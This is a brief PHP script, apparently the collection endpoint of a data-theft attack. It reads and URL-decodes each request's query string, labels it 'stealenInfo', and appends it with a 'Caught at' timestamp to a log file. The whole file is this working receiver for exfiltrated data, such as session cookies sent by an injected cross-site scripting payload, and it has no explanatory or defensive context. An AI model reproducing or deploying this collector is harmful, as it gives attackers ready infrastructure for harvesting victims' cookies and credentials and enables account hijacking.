<?php
$stealenInfo = urldecode($_SERVER['QUERY_STRING']);

$logFile = fopen("log.txt","a");

fputs($logFile,"Caught at " . date("D M d, Y G:i a") . " info: "
      . $stealenInfo . "\n");
fclose($logFile);
?>
